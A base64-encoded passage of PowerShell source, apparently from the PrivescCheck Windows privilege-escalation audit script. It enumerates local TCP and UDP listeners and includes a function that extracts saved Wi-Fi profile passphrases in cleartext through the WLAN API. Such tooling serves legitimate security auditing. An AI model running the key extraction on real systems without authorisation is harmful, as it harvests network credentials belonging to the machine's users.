rRW5kcG9pbnRzCiAgICAkRW5kcG9pbnRzICs9IEdldC1OZXR3b3JrRW5kcG9pbnRzIC1JUHY2CgogICAgaWYgKCRGaWx0ZXJlZCkgewogICAgICAgICRGaWx0ZXJlZEVuZHBvaW50cyA9IEAoKQogICAgICAgICRBbGxQb3J0cyA9IEAoKQogICAgICAgICRFbmRwb2ludHMgfCBGb3JFYWNoLU9iamVjdCB7ICRBbGxQb3J0cyArPSAkXy5Mb2NhbFBvcnQgfQogICAgICAgICRBbGxQb3J0cyA9ICRBbGxQb3J0cyB8IFNvcnQtT2JqZWN0IC1VbmlxdWUKICAgICAgICAKICAgICAgICAkUnBjUmFuZ2UgPSBHZXQtUnBjUmFuZ2UgLVBvcnRzICRBbGxQb3J0cwogICAgICAgIFdyaXRlLVZlcmJvc2UgIkV4Y2x1ZGluZyBwb3J0IHJhbmdlOiAkKCRScGNSYW5nZS5NaW5Qb3J0KS0kKCRScGNSYW5nZS5NYXhQb3J0KSIKICAgIAogICAgICAgICRFbmRwb2ludHMgfCBGb3JFYWNoLU9iamVjdCB7CgogICAgICAgICAgICBpZiAoLW5vdCAoJElnbm9yZWRQb3J0cyAtY29udGFpbnMgJF8uTG9jYWxQb3J0KSkgewoKICAgICAgICAgICAgICAgIGlmICgkUnBjUmFuZ2UpIHsKCiAgICAgICAgICAgICAgICAgICAgaWYgKCgkXy5Mb2NhbFBvcnQgLWx0ICRScGNSYW5nZS5NaW5Qb3J0KSAtb3IgKCRfLkxvY2FsUG9ydCAtZ2UgJFJwY1JhbmdlLk1heFBvcnQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAkRmlsdGVyZWRFbmRwb2ludHMgKz0gJF8KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgJEVuZHBvaW50cyA9ICRGaWx0ZXJlZEVuZHBvaW50cwogICAgfSAKCiAgICAkRW5kcG9pbnRzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICRUY3BFbmRwb2ludCA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFBTT2JqZWN0CiAgICAgICAgJFRjcEVuZHBvaW50IHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiSVAiIC1WYWx1ZSAkXy5JUAogICAgICAgICRUY3BFbmRwb2ludCB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlByb3RvIiAtVmFsdWUgJF8uUHJvdG8KICAgICAgICAkVGNwRW5kcG9pbnQgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJMb2NhbEFkZHJlc3MiIC1WYWx1ZSAkXy5FbmRwb2ludAogICAgICAgICRUY3BFbmRwb2ludCB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlN0YXRlIiAtVmFsdWUgJF8uU3RhdGUKICAgICAgICAkVGNwRW5kcG9pbnQgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJQSUQiIC1WYWx1ZSAkXy5QSUQKICAgICAgICAkVGNwRW5kcG9pbnQgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJOYW1lIiAtVmFsdWUgJF8uTmFtZQogICAgICAgICRUY3BFbmRwb2ludAogICAgfQp9CgpmdW5jdGlvbiBJbnZva2UtVWRwRW5kcG9pbnRzQ2hlY2sgewogICAgPCMKICAgIC5TWU5PUFNJUwoKICAgIEVudW1lcmF0ZXMgYWxsIFVEUCBlbmRwb2ludHMgb24gdGhlIGxvY2FsIG1hY2hpbmUgKElQdjQgYW5kIElQdjYpCgogICAgQXV0aG9yOiBAaXRtNG4KICAgIExpY2Vuc2U6IEJTRCAzLUNsYXVzZQogICAgCiAgICAuREVTQ1JJUFRJT04KCiAgICBJdCB1c2VzIHRoZSBjdXN0b20gIkdldC1OZXR3b3JrRW5kcG9pbnRzIiBmdW5jdGlvbiB0byBlbnVtZXJhdGUgYWxsIHRoZSBVRFAgZW5kcG9pbnRzIG9uIHRoZQogICAgbG9jYWwgbWFjaGluZSwgSVB2NCBhbmQgSVB2Ni4gVGhlIGxpc3QgY2FuIGJlIGZpbHRlcmVkIGJhc2VkIG9uIGEgbGlzdCBvZiBrbm93biBwb3J0cy4KICAgIAogICAgLlBBUkFNRVRFUiBGaWx0ZXJlZAoKICAgIFVzZSB0aGlzIHN3aXRjaCB0byBmaWx0ZXIgb3V0IHRoZSBsaXN0IG9mIGVuZHBvaW50cyByZXR1cm5lZCBieSB0aGlzIGZ1bmN0aW9uLiBUaGUgZmlsdGVyIAogICAgZXhjbHVkZXMgYWxsIHRoZSBzdGFuZGFyZCBwb3J0cyBzdWNoIGFzIDEzOSBvciA1MDAuCiAgICAKICAgIC5FWEFNUExFCgogICAgUFMgQzpcPiBJbnZva2UtVWRwRW5kcG9pbnRzQ2hlY2sgfCBmdAoKICAgIElQICAgUHJvdG8gTG9jYWxBZGRyZXNzICAgICAgICAgICAgICAgICAgICAgICBTdGF0ZSAgUElEIE5hbWUKICAgIC0tICAgLS0tLS0gLS0tLS0tLS0tLS0tICAgICAgICAgICAgICAgICAgICAgICAtLS0tLSAgLS0tIC0tLS0KICAgIElQdjQgVURQICAgMC4wLjAuMDo1MDUwICAgICAgICAgICAgICAgICAgICAgICBOL0EgICA1NDA4IHN2Y2hvc3QKICAgIElQdjQgVURQICAgMC4wLjAuMDo1MzUzICAgICAgICAgICAgICAgICAgICAgICBOL0EgICAyMTc2IHN2Y2hvc3QKICAgIElQdjQgVURQICAgMC4wLjAuMDo1MzU1ICAgICAgICAgICAgICAgICAgICAgICBOL0EgICAyMTc2IHN2Y2hvc3QKICAgIElQdjQgVURQICAgMC4wLjAuMDo1NDU2NSAgICAgICAgICAgICAgICAgICAgICBOL0EgICAzMTAwIFNreXBlQXBwCiAgICBJUHY0IFVEUCAgIDEyNy4wLjAuMToxOTAwICAgICAgICAgICAgICAgICAgICAgTi9BICAgNTA4OCBzdmNob3N0CiAgICBJUHY0IFVEUCAgIDEyNy4wLjAuMTo1MTAwOCAgICAgICAgICAgICAgICAgICAgTi9BICAgNTA4OCBzdmNob3N0CiAgICBJUHY0IFVEUCAgIDEyNy4wLjAuMTo2MDQwNyAgICAgICAgICAgICAgICAgICAgTi9BICAgMzA1MiBzdmNob3N0CiAgICBJUHY0IFVEUCAgIDE5Mi4xNjguNzQuMTM2OjEzNyAgICAgICAgICAgICAgICAgTi9BICAgICAgNCBTeXN0ZW0KICAgIElQdjQgVURQICAgMTkyLjE2OC43NC4xMzY6MTM4ICAgICAgICAgICAgICAgICBOL0EgICAgICA0IFN5c3RlbQogICAgSVB2NCBVRFAgICAxOTIuMTY4Ljc0LjEzNjoxOTAwICAgICAgICAgICAgICAgIE4vQSAgIDUwODggc3ZjaG9zdAogICAgSVB2NCBVRFAgICAxOTIuMTY4Ljc0LjEzNjo1MTAwNyAgICAgICAgICAgICAgIE4vQSAgIDUwODggc3ZjaG9zdAogICAgSVB2NiBVRFAgICBbOjpdOjUzNTMgICAgICAgICAgICAgICAgICAgICAgICAgIE4vQSAgIDIxNzYgc3ZjaG9zdAogICAgSVB2NiBVRFAgICBbOjpdOjUzNTUgICAgICAgICAgICAgICAgICAgICAgICAgIE4vQSAgIDIxNzYgc3ZjaG9zdAogICAgSVB2NiBVRFAgICBbOjpdOjU0NTY1ICAgICAgICAgICAgICAgICAgICAgICAgIE4vQSAgIDMxMDAgU2t5cGVBcHAKICAgIElQdjYgVURQICAgWzo6MV06MTkwMCAgICAgICAgICAgICAgICAgICAgICAgICBOL0EgICA1MDg4IHN2Y2hvc3QKICAgIElQdjYgVURQICAgWzo6MV06NTEwMDYgICAgICAgICAgICAgICAgICAgICAgICBOL0EgICA1MDg4IHN2Y2hvc3QKICAgIElQdjYgVURQICAgW2ZlODA6OjNhOmI2YzA6YjVmMDphMDVlJTEyXToxOTAwICBOL0EgICA1MDg4IHN2Y2hvc3QKICAgIElQdjYgVURQICAgW2ZlODA6OjNhOmI2YzA6YjVmMDphMDVlJTEyXTo1MTAwNSBOL0EgICA1MDg4IHN2Y2hvc3QKICAgIAogICAgIz4KICAgIAogICAgW0NtZGxldEJpbmRpbmcoKV1QYXJhbSgKICAgICAgICBbc3dpdGNoXSRGaWx0ZXJlZAogICAgKQoKICAgICMgaHR0cHM6Ly9zdXBwb3J0Lm1pY3Jvc29mdC5jb20vZW4tdXMvaGVscC84MzIwMTcvc2VydmljZS1vdmVydmlldy1hbmQtbmV0d29yay1wb3J0LXJlcXVpcmVtZW50cy1mb3Itd2luZG93cwogICAgJElnbm9yZWRQb3J0cyA9IEAoNTMsIDY3LCAxMjMsIDEzNywgMTM4LCAxMzksIDUwMCwgMTcwMSwgMjUzNSwgNDUwMCwgNDQ1LCAxOTAwLCA1MDUwLCA1MzUzLCA1MzU1KQogICAgCiAgICAkRW5kcG9pbnRzID0gR2V0LU5ldHdvcmtFbmRwb2ludHMgLVVEUCAKICAgICRFbmRwb2ludHMgKz0gR2V0LU5ldHdvcmtFbmRwb2ludHMgLVVEUCAtSVB2NgoKICAgIGlmICgkRmlsdGVyZWQpIHsKICAgICAgICAkRmlsdGVyZWRFbmRwb2ludHMgPSBAKCkKICAgICAgICAkRW5kcG9pbnRzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICBpZiAoLW5vdCAoJElnbm9yZWRQb3J0cyAtY29udGFpbnMgJF8uTG9jYWxQb3J0KSkgewogICAgICAgICAgICAgICAgJEZpbHRlcmVkRW5kcG9pbnRzICs9ICRfCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgJEVuZHBvaW50cyA9ICRGaWx0ZXJlZEVuZHBvaW50cwogICAgfQoKICAgICRFbmRwb2ludHMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgaWYgKC1ub3QgKCRfLk5hbWUgLWVxICJkbnMiKSkgewogICAgICAgICAgICAkVWRwRW5kcG9pbnQgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdCAKICAgICAgICAgICAgJFVkcEVuZHBvaW50IHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiSVAiIC1WYWx1ZSAkXy5JUAogICAgICAgICAgICAkVWRwRW5kcG9pbnQgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJQcm90byIgLVZhbHVlICRfLlByb3RvCiAgICAgICAgICAgICRVZHBFbmRwb2ludCB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIkxvY2FsQWRkcmVzcyIgLVZhbHVlICRfLkVuZHBvaW50CiAgICAgICAgICAgICRVZHBFbmRwb2ludCB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlN0YXRlIiAtVmFsdWUgJF8uU3RhdGUKICAgICAgICAgICAgJFVkcEVuZHBvaW50IHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiUElEIiAtVmFsdWUgJF8uUElECiAgICAgICAgICAgICRVZHBFbmRwb2ludCB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIk5hbWUiIC1WYWx1ZSAkXy5OYW1lCiAgICAgICAgICAgICRVZHBFbmRwb2ludAogICAgICAgIH0KICAgIH0KfQoKZnVuY3Rpb24gSW52b2tlLVdsYW5Qcm9maWxlc0NoZWNrIHsKICAgIDwjCiAgICAuU1lOT1BTSVMKCiAgICBFbnVtZXJhdGVzIHRoZSBzYXZlZCBXaWZpIHByb2ZpbGVzIGFuZCBleHRyYWN0IHRoZSBjbGVhcnRleHQga2V5L3Bhc3NwaHJhc2Ugd2hlbiBhcHBsaWNhYmxlCgogICAgQXV0aG9yOiBAaXRtNG4KICAgIExpY2Vuc2U6IEJTRCAzLUNsYXVzZQogICAgCiAgICAuREVTQ1JJUFRJT04KCiAgICBUaGUgYnVpbHQtaW4gIm5ldHNoIiBjb21tYW5kIGFsbG93cyBvbmUgdG8gbGlzdCB0aGUgc2F2ZWQgV2lmaSBwcm9maWxlcyBhbmQgZXh0cmFjdCB0aGUgY2xlYXJ0ZXh0CiAgICBrZXkgb3IgcGFzc3BocmFzZSB3aGVuIGFwcGxpY2FibGUgKGUuZy46ICJuZXRzaCB3bGFuIHNob3cgcHJvZmlsZSBNeVdpZmlQcm9maWxlIGtleT1jbGVhciIpLiBUaGlzCiAgICBmdW5jdGlvbiBhY2hpZXZlcyB0aGUgc2FtZSBnb2FsLiBJdCBpdGVyYXRlcyB0aGUgbGlzdCBvZiBXbGFuIGludGVyZmFjZXMgaW4gb3JkZXIgdG8gZW51bWVyYXRlCiAgICBhbGwgdGhlIFdpZmkgcHJvZmlsZXMgd2hpY2ggY2FuIGJlIGFjY2Vzc2VkIGluIHRoZSBjb250ZXh0IG9mIHRoZSBjdXJyZW50IHVzZXIuIElmIGEgbmV0d29yayBpcyAKICAgIGNvbmZpZ3VyZWQgd2l0aCBXRVAgb3IgUFNLIGF1dGhlbnRpY2F0aW9uLCBpdCB3aWxsIGF0dGVtcHQgdG8gZXh0cmFjdCB0aGUgY2xlYXJ0ZXh0IHZhbHVlIG9mIHRoZQogICAga2V5IG9yIHBhc3NwaHJhc2UuIAogICAgCiAgICAuRVhBTVBMRQogICAgCiAgICBQUyBDOlw+IEludm9rZS1XbGFuUHJvZmlsZXNDaGVjawoKICAgIFByb2ZpbGUgICAgICAgIDogTXlTZWNyZXRBY2Nlc3NQb2ludAogICAgU1NJRCAgICAgICAgICAgOiBNeVNlY3JldEFjY2Vzc1BvaW50CiAgICBBdXRoZW50aWNhdGlvbiA6IFdQQTJQU0sKICAgIFBhc3NQaHJhc2UgICAgIDogQXZFcllzRWNSZVRwQXNTcEhyQXNFCiAgICBJbnRlcmZhY2UgICAgICA6IENvbXBhY3QgV2lyZWxlc3MtRyBVU0IgTmV0d29yayBBZGFwdGVyCiAgICAKICAgICM+CgogICAgW0NtZGxldEJpbmRpbmcoKV0gcGFyYW0oKQoKICAgIGZ1bmN0aW9uIENvbnZlcnQtUHJvZmlsZVhtbFRvT2JqZWN0IHsKCiAgICAgICAgW0NtZGxldEJpbmRpbmcoKV0gcGFyYW0oCiAgICAgICAgICAgIFtzdHJpbmddJFByb2ZpbGVYbWwKICAgICAgICApCgogICAgICAgICRYbWwgPSBbeG1sXSAkUHJvZmlsZVhtbAoKICAgICAgICAkTmFtZSA9ICRYbWwuV0xBTlByb2ZpbGUubmFtZQogICAgICAgICRTc2lkID0gJFhtbC5XTEFOUHJvZmlsZS5TU0lEQ29uZmlnLlNTSUQubmFtZSAKICAgICAgICAkQXV0aGVudGljYXRpb24gPSAkWG1sLldMQU5Qcm9maWxlLk1TTS5zZWN1cml0eS5hdXRoRW5jcnlwdGlvbi5hdXRoZW50aWNhdGlvbgogICAgICAgICRQYXNzUGhyYXNlID0gJFhtbC5XTEFOUHJvZmlsZS5NU00uc2VjdXJpdHkuc2hhcmVkS2V5LmtleU1hdGVyaWFsCgogICAgICAgICRQcm9maWxlUmVzdWx0ID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgUFNPYmplY3QKICAgICAgICAkUHJvZmlsZVJlc3VsdCB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlByb2ZpbGUiIC1WYWx1ZSAkTmFtZQogICAgICAgICRQcm9maWxlUmVzdWx0IHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiU1NJRCIgLVZhbHVlICRTc2lkCiAgICAgICAgJFByb2ZpbGVSZXN1bHQgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJBdXRoZW50aWNhdGlvbiIgLVZhbHVlICRBdXRoZW50aWNhdGlvbgogICAgICAgICRQcm9maWxlUmVzdWx0IHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiUGFzc1BocmFzZSIgLVZhbHVlICRQYXNzUGhyYXNlCiAgICAgICAgJFByb2ZpbGVSZXN1bHQKICAgIH0KCiAgICAkRVJST1JfU1VDQ0VTUyA9IDAKCiAgICB0cnkgewogICAgICAgIFtJbnRQdHJdJENsaWVudEhhbmRsZSA9IFtJbnRQdHJdOjpaZXJvCiAgICAgICAgJE5lZ290aWF0ZWRWZXJzaW9uID0gMAogICAgICAgICRSZXN1bHQgPSBbUHJpdmVzY0NoZWNrLldpbjMyXTo6V2xhbk9wZW5IYW5kbGUoMiwgW0ludFB0cl06Olplcm8sIFtyZWZdJE5lZ290aWF0ZWRWZXJzaW9uLCBbcmVmXSRDbGllbnRIYW5kbGUpCiAgICAgICAgaWYgKCRSZXN1bHQgLWVxICRFUlJPUl9TVUNDRVNTKSB7CiAgICAKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiV2xhbk9wZW5IYW5kbGUoKSBPSyAtIEhhbmRsZTogJCgkQ2xpZW50SGFuZGxlKSIKICAgIAogICAgICAgICAgICBbSW50UHRyXSRJbnRlcmZhY2VMaXN0UHRyID0gW0ludFB0cl06Olplcm8KICAgICAgICAgICAgJFJlc3VsdCA9IFtQcml2ZXNjQ2hlY2suV2luMzJdOjpXbGFuRW51bUludGVyZmFjZXMoJENsaWVudEhhbmRsZSwgW0ludFB0cl06Olplcm8sIFtyZWZdJEludGVyZmFjZUxpc3RQdHIpCiAgICAgICAgICAgIGlmICgkUmVzdWx0IC1lcSAkRVJST1JfU1VDQ0VTUykgewogICAgCiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJXbGFuRW51bUludGVyZmFjZXMoKSBPSyAtIEludGVyZmFjZSBsaXN0IHBvaW50ZXI6IDB4JCgkSW50ZXJmYWNlTGlzdFB0ci5Ub1N0cmluZygnWDgnKSkiCiAgICAKICAgICAgICAgICAgICAgICROdW1iZXJPZkludGVyZmFjZXMgPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlJlYWRJbnQzMigkSW50ZXJmYWNlTGlzdFB0cikKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIk51bWJlciBvZiBXbGFuIGludGVyZmFjZXM6ICQoJE51bWJlck9mSW50ZXJmYWNlcykiCiAgICAKICAgICAgICAgICAgICAgICMgQ2FsY3VsYXRlIHRoZSBwb2ludGVyIHRvIHRoZSBmaXJzdCBXTEFOX0lOVEVSRkFDRV9JTkZPIHN0cnVjdHVyZSAKICAgICAgICAgICAgICAgICRXbGFuSW50ZXJmYWNlSW5mb1B0ciA9IFtJbnRQdHJdICgkSW50ZXJmYWNlTGlzdFB0ci5Ub0ludDY0KCkgKyA4KSAjIGR3TnVtYmVyT2ZJdGVtcyArIGR3SW5kZXgKICAgIAogICAgICAgICAgICAgICAgZm9yICgkaSA9IDA7ICRpIC1sdCAkTnVtYmVyT2ZJbnRlcmZhY2VzOyAkaSsrKSB7CiAgICAKICAgICAgICAgICAgICAgICAgICAkV2xhbkludGVyZmFjZUluZm8gPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkV2xhbkludGVyZmFjZUluZm9QdHIsIFt0eXBlXSBbUHJpdmVzY0NoZWNrLldpbjMyK1dMQU5fSU5URVJGQUNFX0lORk9dKQogICAgCiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiV2xhbiBpbnRlcmZhY2U6ICQoJFdsYW5JbnRlcmZhY2VJbmZvLnN0ckludGVyZmFjZURlc2NyaXB0aW9uKSIKICAgIAogICAgICAgICAgICAgICAgICAgIFtJbnRQdHJdJFByb2ZpbGVMaXN0UHRyID0gW0ludFB0cl06Olplcm8KICAgICAgICAgICAgICAgICAgICAkUmVzdWx0ID0gW1ByaXZlc2NDaGVjay5XaW4zMl06OldsYW5HZXRQcm9maWxlTGlzdCgkQ2xpZW50SGFuZGxlLCAkV2xhbkludGVyZmFjZUluZm8uSW50ZXJmYWNlR3VpZCwgW0ludFB0cl06Olplcm8sIFtyZWZdJFByb2ZpbGVMaXN0UHRyKQogICAgICAgICAgICAgICAgICAgIGlmICgkUmVzdWx0IC1lcSAkRVJST1JfU1VDQ0VTUykgewogICAgCiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIldsYW5HZXRQcm9maWxlTGlzdCgpIE9LIC0gUHJvZmlsZSBsaXN0IHBvaW50ZXI6IDB4JCgkUHJvZmlsZUxpc3RQdHIuVG9TdHJpbmcoJ1g4JykpIgogICAgCiAgICAgICAgICAgICAgICAgICAgICAgICROdW1iZXJPZlByb2ZpbGVzID0gW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpSZWFkSW50MzIoJFByb2ZpbGVMaXN0UHRyKQogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJOdW1iZXIgb2YgcHJvZmlsZXM6ICQoJE51bWJlck9mUHJvZmlsZXMpIgogICAgCiAgICAgICAgICAgICAgICAgICAgICAgICMgQ2FsY3VsYXRlIHRoZSBwb2ludGVyIHRvIHRoZSBmaXJzdCBXTEFOX1BST0ZJTEVfSU5GTyBzdHJ1Y3R1cmUgCiAgICAgICAgICAgICAgICAgICAgICAgICRXbGFuUHJvZmlsZUluZm9QdHIgPSBbSW50UHRyXSAoJFByb2ZpbGVMaXN0UHRyLlRvSW50NjQoKSArIDgpICMgZHdOdW1iZXJPZkl0ZW1zICsgZHdJbmRleAogICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciAoJGogPSAwOyAkaiAtbHQgJE51bWJlck9mUHJvZmlsZXM7ICRqKyspIHsKICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFdsYW5Qcm9maWxlSW5mbyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRXbGFuUHJvZmlsZUluZm9QdHIsIFt0eXBlXSBbUHJpdmVzY0NoZWNrLldpbjMyK1dMQU5fUFJPRklMRV9JTkZPXSkKICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiV2xhbiBwcm9maWxlOiAkKCRXbGFuUHJvZmlsZUluZm8uc3RyUHJvZmlsZU5hbWUpIgogICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBbc3RyaW5nXSRQcm9maWxlWG1sID0gIiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFtVSW50MzJdJFdsYW5Qcm9maWxlRmxhZ3MgPSA0ICMgV0xBTl9QUk9GSUxFX0dFVF9QTEFJTlRFWFRfS0VZCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBbVUludDMyXSRXbGFuUHJvZmlsZUFjY2Vzc0ZsYWdzID0gMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFJlc3VsdCA9IFtQcml2ZXNjQ2hlY2suV2luMzJdOjpXbGFuR2V0UHJvZmlsZSgkQ2xpZW50SGFuZGxlLCAkV2xhbkludGVyZmFjZUluZm8uSW50ZXJmYWNlR3VpZCwgJFdsYW5Qcm9maWxlSW5mby5zdHJQcm9maWxlTmFtZSwgW0ludFB0cl06Olplcm8sIFtyZWZdJFByb2ZpbGVYbWwsIFtyZWZdJFdsYW5Qcm9maWxlRmxhZ3MsIFtyZWZdJFdsYW5Qcm9maWxlQWNjZXNzRmxhZ3MpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJFJlc3VsdCAtZXEgJEVSUk9SX1NVQ0NFU1MpIHsKICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIldsYW5HZXRQcm9maWxlKCkgT0siCiAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSXRlbSA9IENvbnZlcnQtUHJvZmlsZVhtbFRvT2JqZWN0IC1Qcm9maWxlWG1sICRQcm9maWxlWG1sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJJbnRlcmZhY2UiIC1WYWx1ZSAkV2xhbkludGVyZmFjZUluZm8uc3RySW50ZXJmYWNlRGVzY3JpcHRpb24KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSXRlbQogICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIldsYW5HZXRQcm9maWxlKCkgZmFpbGVkIChFcnI6ICQoJFJlc3VsdCkpIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIENhbGN1bGF0ZSB0aGUgcG9pbnRlciB0byB0aGUgbmV4dCBXTEFOX1BST0ZJTEVfSU5GTyBzdHJ1Y3R1cmUgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkV2xhblByb2ZpbGVJbmZvUHRyID0gW0ludFB0cl0gKCRXbGFuUHJvZmlsZUluZm9QdHIuVG9JbnQ2NCgpICsgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKCRXbGFuUHJvZmlsZUluZm8pKQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAKICAgICAgICAgICAgICAgICAgICAgICAgIyBjbGVhbnVwCiAgICAgICAgICAgICAgICAgICAgICAgIFtQcml2ZXNjQ2hlY2suV2luMzJdOjpXbGFuRnJlZU1lbW9yeSgkUHJvZmlsZUxpc3RQdHIpCiAgICAKICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJXbGFuR2V0UHJvZmlsZUxpc3QoKSBmYWlsZWQgKEVycjogJCgkUmVzdWx0KSkiCiAgICAgICAgICAgICAgICAgICAgfQogICAgCiAgICAgICAgICAgICAgICAgICAgIyBDYWxjdWxhdGUgdGhlIHBvaW50ZXIgdG8gdGhlIG5leHQgV0xBTl9JTlRFUkZBQ0VfSU5GTyBzdHJ1Y3R1cmUgCiAgICAgICAgICAgICAgICAgICAgJFdsYW5JbnRlcmZhY2VJbmZvUHRyID0gW0ludFB0cl0gKCRXbGFuSW50ZXJmYWNlSW5mb1B0ci5Ub0ludDY0KCkgKyBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoJFdsYW5JbnRlcmZhY2VJbmZvKSkKICAgICAgICAgICAgICAgIH0KICAgIAogICAgICAgICAgICAgICAgIyBjbGVhbnVwCiAgICAgICAgICAgICAgICBbUHJpdmVzY0NoZWNrLldpbjMyXTo6V2xhbkZyZWVNZW1vcnkoJEludGVyZmFjZUxpc3RQdHIpCiAgICAKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIldsYW5FbnVtSW50ZXJmYWNlcygpIGZhaWxlZCAoRXJyOiAkKCRSZXN1bHQpKSIKICAgICAgICAgICAgfQogICAgCiAgICAgICAgICAgICMgY2xlYW51cAogICAgICAgICAgICAkUmVzdWx0ID0gW1ByaXZlc2NDaGVjay5XaW4zMl06OldsYW5DbG9zZUhhbmRsZSgkQ2xpZW50SGFuZGxlLCBbSW50UHRyXTo6WmVybykKICAgICAgICAgICAgaWYgKCRSZXN1bHQgLWVxICRFUlJPUl9TVUNDRVNTKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJXbGFuQ2xvc2VIYW5kbGUoKSBPSyIKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIldsYW5DbG9zZUhhbmRsZSgpIGZhaWxlZCAoRXJyOiAkKCRSZXN1bHQpKSIKICAgICAgICAgICAgfQogICAgCiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiV2xhbk9wZW5IYW5kbGUoKSBmYWlsZWQgKEVycjogJCgkUmVzdWx0KSkiCiAgICAgICAgfQogICAgfSBjYXRjaCB7CiAgICAgICAgIyBEbyBub3RoaW5nCiAgICAgICAgIyBXbGFuIEFQSSBkb2Vzbid0IGV4aXN0IG9uIHRoaXMgbWFjaGluZSBwcm9iYWJseSAKICAgIH0KfQojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBFTkQgTkVUV09SSyAgICAKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0